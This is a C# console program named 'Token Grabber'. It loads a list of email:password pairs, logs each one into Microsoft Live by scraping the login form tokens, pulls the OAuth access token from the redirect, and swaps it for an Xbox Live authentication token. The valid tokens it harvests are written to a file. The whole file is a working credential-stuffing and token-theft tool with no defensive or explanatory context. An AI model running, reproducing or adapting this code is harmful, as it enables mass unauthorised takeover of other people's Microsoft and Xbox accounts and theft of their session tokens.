using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Threading;
using System.Windows.Forms;

namespace Token_Grabber
{
	internal class Program
	{
		private List<string> List1 = new List<string>();

		private List<string> List2 = new List<string>();

		private List<string> List3 = new List<string>();

		private List<string> List4 = new List<string>();

		[STAThread]
		private static void Main(string[] args)
		{
			Console.CursorVisible = false;
			Console.SetWindowSize(45, 12);
			Console.SetBufferSize(45, 12);
			Console.Title = "Token Grabber";
			OpenFileDialog openFileDialog = new OpenFileDialog();
			openFileDialog.Filter = "*.txt|*.txt";
			openFileDialog.Title = Console.Title;
			ServicePointManager.CheckCertificateRevocationList = false;
			ServicePointManager.DefaultConnectionLimit = int.MaxValue;
			ServicePointManager.Expect100Continue = false;
			ServicePointManager.UseNagleAlgorithm = false;
			if (openFileDialog.ShowDialog() == DialogResult.OK)
			{
				Program program = new Program();
				program.List1.AddRange(File.ReadAllLines(openFileDialog.FileName));
				for (int i = 0; i <= program.List1.Count - 1; i++)
				{
					program.Void(i);
					Thread.Sleep(10);
				}
			}
			Console.ReadKey();
		}

		private async void Void(int Integer)
		{
			CookieContainer CookieContainer = new CookieContainer();
			WebClientEx WebClientEx = new WebClientEx(CookieContainer);
			try
			{
				string String1 = await WebClientEx.DownloadStringTaskAsync("https://login.live.com/oauth20_authorize.srf?display=touch&scope=service%3A%3Auser.auth.xboxlive.com%3A%3AMBI_SSL&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf&locale=en&response_type=token&client_id=0000000048093EE3");
				string[] String7 = String1.Split(new string[1] { "urlPost:'" }, StringSplitOptions.None);
				string String8 = String7[1];
				string[] String9 = String8.Split('\'');
				string[] String10 = String1.Split(new string[1] { "PPFT\" id=\"i0327\" value=\"" }, StringSplitOptions.None);
				string String11 = String10[1];
				string[] String12 = String11.Split('"');
				string[] String13 = List1[Integer].Split(':');
				WebClientEx.Headers[HttpRequestHeader.ContentType] = "application/x-www-form-urlencoded";
				await WebClientEx.UploadStringTaskAsync(String9[0], "post", "i13=1&login=" + String13[0] + "&loginfmt=" + String13[0] + "&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd=" + String13[1] + "&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT=" + String12[0] + "&PPSX=Passpo&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=1&isSignupPost=0&i2=39&i17=0&i18=&i19=8869");
				WebHeaderCollection WebHeaderCollection = WebClientEx.ResponseHeaders;
				string[] String14 = WebHeaderCollection.Get("Location").Split(new string[1] { "access_token=" }, StringSplitOptions.None);
				string String2 = String14[1];
				string[] String3 = String2.Split('&');
				string[] String4 = (await new WebClient
				{
					Headers = { [HttpRequestHeader.ContentType] = "application/json" }
				}.UploadStringTaskAsync("https://user.auth.xboxlive.com/user/authenticate", "post", "{\"RelyingParty\":\"http://auth.xboxlive.com\",\"TokenType\":\"JWT\",\"Properties\":{\"AuthMethod\":\"RPS\",\"SiteName\":\"user.auth.xboxlive.com\",\"RpsTicket\":\"" + String3[0] + "\"}}")).Split(new string[1] { "Token\":\"" }, StringSplitOptions.None);
				string String5 = String4[1];
				string[] String6 = String5.Split('"');
				List2.Add(String6[0]);
				List3.Add(List1[Integer]);
			}
			catch
			{
				List4.Add(List1[Integer]);
			}
			if (Integer != List1.Count - 1)
			{
				return;
			}
			bool Bool = false;
			while (!Bool)
			{
				int Integer2 = List3.Count + List4.Count;
				if (Integer2 == List1.Count)
				{
					Bool = true;
					StreamWriter StreamWriter = new StreamWriter(string.Concat(str2: new Random().Next(1000000000, int.MaxValue).ToString(), str0: Environment.CurrentDirectory, str1: "/", str3: ".txt"));
					List2.ForEach(StreamWriter.WriteLine);
					StreamWriter.Close();
					Environment.Exit(-1);
				}
				Thread.Sleep(100);
			}
		}
	}
}
